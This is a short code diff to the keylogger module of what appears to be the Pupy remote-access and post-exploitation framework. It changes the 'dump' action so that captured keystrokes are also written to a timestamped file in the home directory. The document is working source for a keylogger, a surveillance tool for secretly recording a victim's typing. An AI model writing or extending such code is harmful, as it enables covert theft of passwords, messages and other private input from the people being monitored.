@@ -44,6 +44,12 @@ class KeyloggerModule(PupyModule):
 				return
 			if args.action=="dump":
 				self.success("dumping recorded keystrokes :")
+				date      = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+				dump_file = os.path.expanduser('~/keystrokes_' + str(date) + '.txt')
+				f         = open(dump_file,'w')
+				f.write(self.keylogger.dump())
+				f.close()
+				self.success("File saved in: " + dump_file + "\n")
 				self.log(self.keylogger.dump())
 			elif args.action=="stop":
 				self.keylogger.stop()
